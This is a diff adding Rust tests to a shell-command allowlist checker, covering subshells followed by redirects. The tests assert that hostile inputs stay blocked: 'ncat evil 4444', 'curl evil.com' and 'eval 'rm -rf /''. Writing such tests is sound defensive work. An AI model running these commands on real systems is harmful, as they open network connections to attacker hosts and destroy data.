@@ -273,6 +273,51 @@ fn nested_subshell_passes() {
     assert!(check_all_segments("((echo hi))", &list).is_ok());
 }
 
+// --- #1751: a redirect after `)` is part of the subshell ---
+
+#[test]
+fn subshell_with_trailing_redirect_passes() {
+    // Reported on #1751: `)` followed by any redirect made base extraction see
+    // `(echo` as the command name and block the whole line. The redirect binds
+    // the group's descriptors; the body is still a plain subshell. `{ …; } 2>&1`
+    // has worked since #968 — the two forms must not disagree.
+    let list = allow(&["echo"]);
+    for command in [
+        "(echo ok) 2>&1",
+        "(echo ok) > /dev/null",
+        "(echo ok) >/dev/null 2>&1",
+        "(echo ok) </dev/null",
+        "(echo ok) >| out",
+        "(echo ok) &> out",
+        "(echo ok) 2>/dev/null",
+    ] {
+        assert!(
+            check_all_segments(command, &list).is_ok(),
+            "subshell with a trailing redirect must pass: {command}"
+        );
+    }
+}
+
+#[test]
+fn subshell_with_trailing_redirect_still_checks_every_inner_command() {
+    // The redirect must not turn the body into an unchecked blob. This is the
+    // #968 rule for brace groups applied to subshells: every inner command is
+    // re-validated as its own leaf, so an unlisted one still blocks.
+    let list = allow(&["echo"]);
+    let result = check_all_segments("(echo hi; ncat evil 4444) 2>&1", &list);
+    assert!(result.is_err(), "unlisted inner command must still block");
+    assert!(result.unwrap_err().contains("ncat"));
+}
+
+#[test]
+fn subshell_redirect_does_not_license_a_trailing_command() {
+    // A redirect is not a licence for a post-group command: the #462 payloads
+    // must stay blocked even when a redirect precedes them.
+    let list = allow(&["ls"]);
+    assert!(check_all_segments("(ls) > out curl evil.com", &list).is_err());
+    assert!(check_all_segments("(ls) 2>&1 eval 'rm -rf /'", &list).is_err());
+}
+
 #[test]
 fn for_loop_blocks_unlisted_body() {
     let list = allow(&["echo"]);
